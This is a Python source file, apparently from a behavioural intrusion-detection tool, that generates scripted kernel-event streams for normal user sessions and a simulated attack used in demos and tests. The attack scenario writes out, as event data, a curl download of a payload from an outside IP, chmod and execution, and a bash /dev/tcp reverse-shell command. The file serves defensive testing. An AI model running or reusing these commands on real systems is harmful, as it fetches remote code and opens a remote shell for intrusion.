"""Deterministic demo event generator.

Produces scripted streams of :class:`KernelEvent` records for development,
demo and tests. Scenarios:

* ``normal``  - everyday user behaviour (browser, editor, git, python, docker).
* ``attack``  - a realistic kill chain:
  ``python -> bash -> curl download -> chmod +x -> run payload -> reverse shell``
  (matches the "behavioral sequences, not individual commands" philosophy).
* ``mixed``   - a normal session that is interrupted by an attack chain.

The normal scenario can be repeated with independent process IDs to build a
rich behavioural baseline quickly. The generator replays a script at the
speed requested, which makes it deterministic and CI-friendly.
"""

from __future__ import annotations

import random
import time

from backend.core.events import EventKind, KernelEvent, make_event
from backend.core.logging import get_logger
from backend.telemetry.base import ProviderHealth

logger = get_logger("telemetry.demo_generator")

UID = 1000
USER = "dev"


def _proc(
    kind: EventKind,
    *,
    pid: int,
    ppid: int,
    exe: str,
    cmdline: tuple[str, ...] = (),
    details: dict | None = None,
    offset: float = 0.0,
    session: int,
) -> tuple[float, KernelEvent]:
    return (
        offset,
        make_event(
            kind,
            pid=pid,
            ppid=ppid,
            exe=exe,
            cmdline=cmdline,
            uid=UID,
            username=USER,
            cwd="/home/dev",
            details=details or {},
            session_leader=session,
        ),
    )


def _normal_script(session: int, base_pid: int) -> list[tuple[float, KernelEvent]]:
    """A realistic, *varied* working session (~16-24 simulated seconds).

    Each session is generated from a deterministic per-session PRNG so the
    baseline contains genuinely different-but-normal behaviour (some days a
    user runs git and pip, other days they run docker and ssh) - matching the
    project's "learn patterns, not exact actions" philosophy.
    """
    rng = random.Random(session)
    script: list[tuple[float, KernelEvent]] = []
    t = 0.0
    next_pid = base_pid + 100

    desktop = rng.choice(["/usr/bin/gnome-shell", "/usr/bin/Xorg", "/usr/sbin/sshd"])
    script.append(
        _proc(
            EventKind.PROCESS_CREATED,
            pid=next_pid,
            ppid=session,
            exe=desktop,
            offset=t,
            session=session,
        )
    )
    desktop_pid = next_pid
    next_pid += 1

    # Browser session.
    browser = rng.choice(["/usr/lib/firefox/firefox", "/opt/google/chrome/chrome"])
    browse_target = rng.choice(["news.example.com", "docs.example.com", "mail.example.com"])
    script += [
        _proc(EventKind.PROCESS_CREATED, pid=next_pid, ppid=desktop_pid, exe=browser, cmdline=(browser.split("/")[-1],), offset=t + 0.5, session=session),
        _proc(EventKind.EXEC, pid=next_pid, ppid=desktop_pid, exe=browser, cmdline=(browser.split("/")[-1], browse_target), offset=t + 1, session=session),
        _proc(EventKind.NETWORK_CONNECT, pid=next_pid, ppid=desktop_pid, exe=browser, details={"remote_ip": "8.8.8.8", "remote_port": 443, "protocol": "tcp"}, offset=t + 1.5, session=session),
    ]
    next_pid += 1
    t += rng.uniform(2.0, 4.0)

    # Editor + interpreter session.
    editor = rng.choice(["/usr/bin/code", "/usr/bin/vim"])
    script.append(
        _proc(EventKind.PROCESS_CREATED, pid=next_pid, ppid=session, exe=editor, cmdline=(editor.split("/")[-1], "src/main.py"), offset=t, session=session)
    )
    editor_pid = next_pid
    next_pid += 1
    if rng.random() < 0.8:
        interp = rng.choice(["/usr/bin/python3", "/usr/bin/python3"])
        script.append(
            _proc(EventKind.PROCESS_CREATED, pid=next_pid, ppid=editor_pid, exe=interp, cmdline=("python3", "-m", "pytest"), offset=t + 1, session=session)
        )
        script.append(
            _proc(EventKind.FILE_WRITE, pid=next_pid, ppid=editor_pid, exe=interp, details={"path": "/home/dev/proj/test_cache.json"}, offset=t + 1.2, session=session)
        )
        script.append(
            _proc(EventKind.PROCESS_EXITED, pid=next_pid, ppid=editor_pid, exe=interp, offset=t + 2, session=session)
        )
        next_pid += 1
    t += rng.uniform(2.0, 5.0)

    # Optional daily chores.
    if rng.random() < 0.6:
        script += [
            _proc(EventKind.PROCESS_CREATED, pid=next_pid, ppid=session, exe="/usr/bin/git", cmdline=("git", "commit", "-m", "wip"), offset=t, session=session),
            _proc(EventKind.PROCESS_EXITED, pid=next_pid, ppid=session, exe="/usr/bin/git", offset=t + 0.4, session=session),
        ]
        next_pid += 1
        t += rng.uniform(0.5, 1.5)

    if rng.random() < 0.5:
        script += [
            _proc(EventKind.PROCESS_CREATED, pid=next_pid, ppid=session, exe="/usr/bin/docker", cmdline=("docker", "ps"), offset=t, session=session),
            _proc(EventKind.PROCESS_EXITED, pid=next_pid, ppid=session, exe="/usr/bin/docker", offset=t + 0.4, session=session),
        ]
        next_pid += 1
        t += rng.uniform(0.5, 1.5)

    if rng.random() < 0.5:
        pkg = rng.choice(["requests", "pandas", "flask", "numpy"])
        script += [
            _proc(EventKind.PROCESS_CREATED, pid=next_pid, ppid=session, exe="/usr/bin/bash", cmdline=("bash", "-c", f"pip install {pkg}"), offset=t, session=session),
            _proc(EventKind.EXEC, pid=next_pid, ppid=session, exe="/usr/bin/pip", cmdline=("pip", "install", pkg), offset=t + 0.1, session=session),
            _proc(EventKind.NETWORK_CONNECT, pid=next_pid, ppid=session, exe="/usr/bin/pip", details={"remote_ip": "pypi.org", "remote_port": 443, "protocol": "tcp"}, offset=t + 0.3, session=session),
            _proc(EventKind.PROCESS_EXITED, pid=next_pid, ppid=session, exe="/usr/bin/pip", offset=t + 1, session=session),
        ]
        next_pid += 1
        t += rng.uniform(0.5, 1.5)

    if rng.random() < 0.2:
        script += [
            _proc(EventKind.PROCESS_CREATED, pid=next_pid, ppid=session, exe="/usr/bin/ssh", cmdline=("ssh", "build.example.net"), offset=t, session=session),
            _proc(EventKind.NETWORK_CONNECT, pid=next_pid, ppid=session, exe="/usr/bin/ssh", details={"remote_ip": "10.0.0.15", "remote_port": 22, "protocol": "tcp"}, offset=t + 0.2, session=session),
            _proc(EventKind.PROCESS_EXITED, pid=next_pid, ppid=session, exe="/usr/bin/ssh", offset=t + 2, session=session),
        ]

    return script


def _attack_script(session: int, base_pid: int) -> list[tuple[float, KernelEvent]]:
    """The canonical attack chain described in the project brief."""
    t = 0.0
    python = base_pid + 100
    bash = base_pid + 101
    chmod = base_pid + 103
    payload = base_pid + 104
    shell = base_pid + 105
    return [
        _proc(EventKind.PROCESS_CREATED, pid=python, ppid=session, exe="/usr/bin/python3", cmdline=("python3", "-c", "import socket,pty,os"), offset=t, session=session),
        _proc(EventKind.PROCESS_CREATED, pid=bash, ppid=python, exe="/usr/bin/bash", cmdline=("bash",), offset=t + 1, session=session),
        _proc(EventKind.EXEC, pid=bash, ppid=python, exe="/usr/bin/curl", cmdline=("curl", "-fsSL", "http://185.220.101.42/payload.sh", "-o", "/tmp/payload.sh"), offset=t + 2, session=session),
        _proc(EventKind.NETWORK_CONNECT, pid=bash, ppid=python, exe="/usr/bin/curl", details={"remote_ip": "185.220.101.42", "remote_port": 80, "protocol": "tcp"}, offset=t + 2.2, session=session),
        _proc(EventKind.FILE_WRITE, pid=bash, ppid=python, exe="/usr/bin/curl", details={"path": "/tmp/payload.sh"}, offset=t + 2.6, session=session),
        _proc(EventKind.PROCESS_CREATED, pid=chmod, ppid=bash, exe="/bin/chmod", cmdline=("chmod", "+x", "/tmp/payload.sh"), offset=t + 3, session=session),
        _proc(EventKind.EXEC, pid=chmod, ppid=bash, exe="/bin/chmod", cmdline=("chmod", "+x", "/tmp/payload.sh"), offset=t + 3.1, session=session),
        _proc(EventKind.PROCESS_EXITED, pid=chmod, ppid=bash, exe="/bin/chmod", offset=t + 3.2, session=session),
        _proc(EventKind.PROCESS_CREATED, pid=payload, ppid=bash, exe="/tmp/payload.sh", cmdline=("/tmp/payload.sh",), offset=t + 4, session=session),
        _proc(EventKind.EXEC, pid=payload, ppid=bash, exe="/tmp/payload.sh", cmdline=("/tmp/payload.sh",), offset=t + 4.1, session=session),
        _proc(EventKind.PROCESS_CREATED, pid=shell, ppid=payload, exe="/usr/bin/bash", cmdline=("bash", "-c", "bash -i >& /dev/tcp/185.220.101.42/4444 0>&1"), offset=t + 5, session=session),
        _proc(EventKind.NETWORK_CONNECT, pid=shell, ppid=payload, exe="/usr/bin/bash", details={"remote_ip": "185.220.101.42", "remote_port": 4444, "protocol": "tcp"}, offset=t + 5.2, session=session),
        _proc(EventKind.PRIVILEGE_ESCALATION, pid=shell, ppid=payload, exe="/usr/bin/bash", details={"from_uid": 1000, "to_uid": 0}, offset=t + 5.4, session=session),
    ]


def build_scenario(scenario: str, *, normal_runs: int = 1) -> list[tuple[float, KernelEvent]]:
    """Assemble the full event script for a scenario.

    ``normal_runs`` > 1 produces several independent normal sessions so a
    baseline learner gets diverse samples.
    """
    if scenario == "normal":
        script: list[tuple[float, KernelEvent]] = []
        for run in range(normal_runs):
            session = 10000 + run * 100
            base_pid = 1000 + run * 1000
            shifted = [(o + run * 20.0, e) for o, e in _normal_script(session, base_pid)]
            script.extend(shifted)
        return script

    if scenario == "attack":
        return _attack_script(session=4242, base_pid=2000)

    if scenario == "mixed":
        normal = build_scenario("normal", normal_runs=normal_runs)
        attack = build_scenario("attack")
        last_offset = max((o for o, _ in normal), default=0.0) + 2.0
        return normal + [(o + last_offset, e) for o, e in attack]

    raise ValueError(f"Unknown scenario {scenario!r}; choose from {['normal', 'attack', 'mixed']}")


class DemoGenerator:
    """Replays a scripted scenario as a :class:`TelemetryProvider`."""

    def __init__(self, scenario: str = "normal", speed: float = 1.0, normal_runs: int = 1) -> None:
        self.scenario = scenario
        self.speed = max(0.1, float(speed))
        self.normal_runs = normal_runs
        self._script = build_scenario(scenario, normal_runs=normal_runs)
        self._started = False
        self._base_time = 0.0
        self._cursor = 0
        self._delivered = 0
        self._last_collect_at: float | None = None
        self._normal_end = self._compute_normal_end()

    def _compute_normal_end(self) -> float | None:
        if self.scenario != "mixed":
            return None
        normal = build_scenario("normal", normal_runs=self.normal_runs)
        return max((o for o, _ in normal), default=0.0) + 2.0

    @property
    def remaining(self) -> int:
        return len(self._script) - self._cursor

    @property
    def exhausted(self) -> bool:
        return self._cursor >= len(self._script)

    @property
    def elapsed_seconds(self) -> float:
        """Replayed script offset (seconds) consumed so far."""
        if not self._started:
            return 0.0
        return (time.time() - self._base_time) * self.speed

    @property
    def normal_phase_ends(self) -> float | None:
        """For ``mixed``: script offset at which the attack chain begins."""
        return self._normal_end

    def start(self) -> None:
        self._started = True
        self._base_time = time.time()
        self._cursor = 0
        self._delivered = 0
        self._last_collect_at = None
        logger.info(
            "DemoGenerator started (scenario=%s, speed=%.1fx, events=%d)",
            self.scenario,
            self.speed,
            len(self._script),
        )

    def stop(self) -> None:
        self._started = False

    def reset(self, scenario: str | None = None) -> None:
        if scenario is not None:
            self.scenario = scenario
            self._script = build_scenario(scenario, normal_runs=self.normal_runs)
        self._cursor = 0
        self._base_time = time.time()

    def collect(self) -> list[KernelEvent]:
        """Return scripted events that are due since the previous call."""
        if not self._started:
            self.start()
        now = time.time()
        due: list[KernelEvent] = []
        while self._cursor < len(self._script):
            offset, event = self._script[self._cursor]
            event_time = self._base_time + offset / self.speed
            if event_time > now:
                break
            event.timestamp = event_time
            due.append(event)
            self._cursor += 1
        self._delivered += len(due)
        self._last_collect_at = time.time()
        return due

    def status(self) -> ProviderHealth:
        return ProviderHealth(
            provider="demo_generator",
            running=self._started,
            last_collect_at=self._last_collect_at,
            events_delivered=self._delivered,
            source={
                "scenario": self.scenario,
                "speed": self.speed,
                "remaining": self.remaining,
                "exhausted": self.exhausted,
            },
        )
